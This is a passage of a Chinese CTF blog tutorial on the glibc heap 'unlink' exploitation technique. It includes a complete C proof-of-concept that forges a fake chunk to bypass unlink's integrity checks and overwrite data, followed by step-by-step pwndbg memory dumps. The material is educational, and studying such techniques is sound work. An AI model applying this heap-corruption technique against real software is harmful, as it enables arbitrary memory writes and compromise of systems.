<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Sakuraのblog" type="application/atom+xml" />






<meta property="og:type" content="website">
<meta property="og:title" content="Sakuraのblog">
<meta property="og:url" content="http://eternalsakura13.com/page/6/index.html">
<meta property="og:site_name" content="Sakuraのblog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Sakuraのblog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: 'QOPH9ID41Z',
      apiKey: '',
      indexName: 'sakura',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://eternalsakura13.com/page/6/"/>





  <title>Sakuraのblog</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-113420358-1', 'auto');
  ga('send', 'pageview');
</script>





</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Sakuraのblog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/03/01/unlink1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/01/unlink1/" itemprop="url">CTF pwn中的unlink</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-01T00:59:01+08:00">
                2018-03-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index">
                    <span itemprop="name">CTF</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/堆利用/" itemprop="url" rel="index">
                    <span itemprop="name">堆利用</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="unlink简介"><a href="#unlink简介" class="headerlink" title="unlink简介"></a>unlink简介</h2><p>unlink的目的是把一个双向链表中的空闲块拿出来，如图。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-131218.jpg" alt=""><br>也就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置 P-&gt;fd-&gt;bk = P-&gt;bk.</span><br><span class="line">设置 P-&gt;bk-&gt;fd = P-&gt;fd.</span><br></pre></td></tr></table></figure></p>
<h2 id="unlink时执行的检查"><a href="#unlink时执行的检查" class="headerlink" title="unlink时执行的检查"></a>unlink时执行的检查</h2><p>以前的unlink是没有检查的，很容易利用，不过现在多了两项检查，所以在利用时候要绕过这些检查。</p>
<table>
<thead>
<tr>
<th>Function</th>
<th style="text-align:right">Security Check</th>
<th style="text-align:center">Error</th>
</tr>
</thead>
<tbody>
<tr>
<td>unlink</td>
<td style="text-align:right">chunk size是否等于next chunk(内存意义上的)的prev_size</td>
<td style="text-align:center">corrupted size vs. prev_size</td>
</tr>
<tr>
<td>unlink</td>
<td style="text-align:right">检查是否P-&gt;fd-&gt;bk == P 以及 P-&gt;bk-&gt;fd == P</td>
<td style="text-align:center">corrupted double-linked list</td>
</tr>
</tbody>
</table>
<h2 id="unlink-exploit"><a href="#unlink-exploit" class="headerlink" title="unlink exploit"></a>unlink exploit</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>通过一个例子来学习一下，这个例子是<a href="https://heap-exploitation.dhavalkapil.com" target="_blank" rel="noopener">Heap Exploitation系列</a>的unlink，为了便于理解，我会用gdb详细的调试一下。<br>首先，编译程序,我使用的系统是ubuntu14.04 64位，将下面的示例代码编译出来，带上-g参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ gcc -g unlink.c -o unlink</span><br><span class="line">unlink.c: In function ‘main’:</span><br><span class="line">unlink.c:46:3: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long long unsigned int’ [-Wformat=]</span><br><span class="line">   printf(&quot;%x\n&quot;, chunk1[3]);</span><br><span class="line">   ^</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> &#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> prev_size;</span><br><span class="line">  <span class="keyword">size_t</span> size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">bk</span>;</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>];               <span class="comment">// padding</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *chunk1, *chunk2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fake_chunk</span>, *<span class="title">chunk2_hdr</span>;</span></span><br><span class="line">  <span class="keyword">char</span> data[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// First grab two chunks (non fast)</span></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk2);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Assuming attacker has control over chunk1's contents</span></span><br><span class="line">  <span class="comment">// Overflow the heap, override chunk2's header</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// First forge a fake chunk starting at chunk1</span></span><br><span class="line">  <span class="comment">// Need to setup fd and bk pointers to pass the unlink security check</span></span><br><span class="line">  fake_chunk = (struct chunk_structure *)chunk1;</span><br><span class="line">  fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - <span class="number">3</span>); <span class="comment">// Ensures P-&gt;fd-&gt;bk == P</span></span><br><span class="line">  fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - <span class="number">2</span>); <span class="comment">// Ensures P-&gt;bk-&gt;fd == P</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Next modify the header of chunk2 to pass all security checks</span></span><br><span class="line">  chunk2_hdr = (struct chunk_structure *)(chunk2 - <span class="number">2</span>);</span><br><span class="line">  chunk2_hdr-&gt;prev_size = <span class="number">0x80</span>;  <span class="comment">// chunk1's data region size</span></span><br><span class="line">  chunk2_hdr-&gt;size &amp;= ~<span class="number">1</span>;        <span class="comment">// Unsetting prev_in_use bit</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'</span></span><br><span class="line">  <span class="comment">// This results in chunk1 pointer pointing to chunk1 - 3</span></span><br><span class="line">  <span class="comment">// i.e. chunk1[3] now contains chunk1 itself.</span></span><br><span class="line">  <span class="comment">// We then make chunk1 point to some victim's data</span></span><br><span class="line">  <span class="built_in">free</span>(chunk2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, chunk1[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  chunk1[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)data;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(data, <span class="string">"Victim's data"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite victim's data using chunk1</span></span><br><span class="line">  chunk1[<span class="number">0</span>] = <span class="number">0x002164656b636168</span>LL;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我使用了一个gdb插件pwndbg(应该是插件吧？)，需要安装的话。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></p>
<p>开始调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b 20</span><br><span class="line">Breakpoint 1 at 0x400695: file unlink.c, line 20.</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure></p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-173449.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure></p>
<p>这样就开始malloc第一个chunk了，返回的地址放在rax里，然后存到栈里。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-173700.png" alt=""><br>继续看第二个chunk的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br></pre></td></tr></table></figure></p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-173806.png" alt=""><br>接下来的三条命令其实就是输出我们刚刚调试出来的chunk地址的，所以过掉就行了，不过可以检查一下我们找的是不是对的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b 25</span><br><span class="line">Breakpoint 2 at 0x4006f3: file unlink.c, line 25.</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">0x7fffffffdd60</span><br><span class="line">0x602010</span><br><span class="line">0x6020a0</span><br></pre></td></tr></table></figure></p>
<p>然后来详细的说明一下，是怎么unlink exploit的。<br>假设攻击者已经控制了chunk1的数据，并且可以溢出到chunk2的元数据。<br>因为我们能够控制chunk1的数据，所以当然可以在chunk1里伪造一个chunk出来。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = (struct chunk_structure *)chunk1;</span><br></pre></td></tr></table></figure></p>
<p>我们知道，返回给我们的chunk实际上是mem指针,<strong>如下图的mem就是chunk1</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-092353.jpg" alt=""><br>通过将chunk1强制转换为struct chunk_structure结构体，就伪造出了一个chunk。<br>相当于<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-135600.jpg" alt=""><br>然后我们看一下此时的chunk1的内存。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>再看一下fake_chunk,地址为0xffffcf80，指向0x0804b008（mem)<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-174334.png" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p $rbp<span class="number">-0x40</span></span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">void</span> *) <span class="number">0x7fffffffdd70</span></span><br><span class="line">pwndbg&gt; x /x <span class="number">0x7fffffffdd70</span></span><br><span class="line"><span class="number">0x7fffffffdd70</span>:	<span class="number">0x0000000000602010</span></span><br></pre></td></tr></table></figure></p>
<h3 id="通过检查点1"><a href="#通过检查点1" class="headerlink" title="通过检查点1"></a>通过检查点1</h3><p><strong>接下来要确保chunk-&gt;fd-&gt;bk == chunk</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - <span class="number">3</span>); <span class="comment">// Ensures P-&gt;fd-&gt;bk == P</span></span><br></pre></td></tr></table></figure></p>
<p>如果不熟悉指针加减运算的，可以参考<a href="http://c.biancheng.net/cpp/biancheng/view/47.html" target="_blank" rel="noopener">这篇文章</a><br>&amp;chunk1是指存放chunk1这个被分配出来的heap的地址的<strong>栈地址</strong>,即0x7fffffffdd60<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 10</span><br><span class="line">00:0000│ rsp  0x7fffffffdd60 —▸ 0x602010 ◂— 0x0</span><br><span class="line">01:0008│      0x7fffffffdd68 —▸ 0x6020a0 ◂— 0x0</span><br><span class="line">02:0010│      0x7fffffffdd70 —▸ 0x602010 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffdd78 —▸ 0x40084d (__libc_csu_init+77) ◂— add    rbx, 1</span><br><span class="line">04:0020│      0x7fffffffdd80 —▸ 0x7fffffffddb0 ◂— 0x0</span><br><span class="line">05:0028│      0x7fffffffdd88 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd90 —▸ 0x400800 (__libc_csu_init) ◂— push   r15</span><br><span class="line">07:0038│      0x7fffffffdd98 ◂— 0xb7dbaa1d9dced400</span><br><span class="line">08:0040│      0x7fffffffdda0 —▸ 0x7fffffffde90 ◂— 0x1</span><br><span class="line">09:0048│      0x7fffffffdda8 ◂— 0x0</span><br></pre></td></tr></table></figure></p>
<p>此时的chunk1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x00007fffffffdd48</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p><strong>接下来要确保chunk-&gt;bk-&gt;fd == chunk</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - <span class="number">2</span>); <span class="comment">// Ensures P-&gt;bk-&gt;fd == P</span></span><br></pre></td></tr></table></figure></p>
<p>此时的chunk1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0000000000000000</span>&lt;=fake_chunk(mem)	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x00007fffffffdd48</span>&lt;=fake_chunk-&gt;fd	<span class="number">0x00007fffffffdd50</span>&lt;=fake_chunk-&gt;bk</span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>我相信到这个时候你已经凌乱了,因为我一开始看到这里的时候也挺凌乱的（因为我指针学的不好emmm..)<br>让我们再理一下。</p>
<p>首先观察一下栈段，我们知道我们的变量都是存在栈上的,chunk1,fake_chunk都是指针,指针的值都是一个表示地址空间中某个存储器单元的整数,这也就是我们说的<strong>指向</strong>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *chunk1, *chunk2;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fake_chunk</span>, *<span class="title">chunk2_hdr</span>;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x40084d</span> (__libc_csu_init+<span class="number">77</span>) ◂— add    rbx, <span class="number">1</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│      <span class="number">0x7fffffffdda0</span> —▸ <span class="number">0x7fffffffde90</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│      <span class="number">0x7fffffffdda8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>chunk1=0x602010<br>&amp;chunk1=0x7fffffffdd60</p>
<p>fake_chunk=0x602010<br>&amp;fake_chunk=0x7fffffffdd70</p>
<p>然后我们再看一下fake_chunk-&gt;fd，和fake_chunk_bk的值是多少。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">10</span>gx <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x602000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x602010</span>:	<span class="number">0x0000000000000000</span>&lt;=fake_chunk(mem)	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:	<span class="number">0x00007fffffffdd48</span>&lt;=fake_chunk-&gt;fd	<span class="number">0x00007fffffffdd50</span>&lt;=fake_chunk-&gt;bk</span><br><span class="line"><span class="number">0x602030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>fake_chunk-&gt;fd=0x00007fffffffdd48<br>fake_chunk-&gt;bk=0x00007fffffffdd50</p>
<p>需要知道的是，fd和bk的类型同样是struct chunk_structure <em>，也就是说fake-&gt;chunk-&gt;fd/bk指向的内存也是”<em>*结构体</em></em>“<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk_structure</span> *<span class="title">bk</span>;</span></span><br></pre></td></tr></table></figure></p>
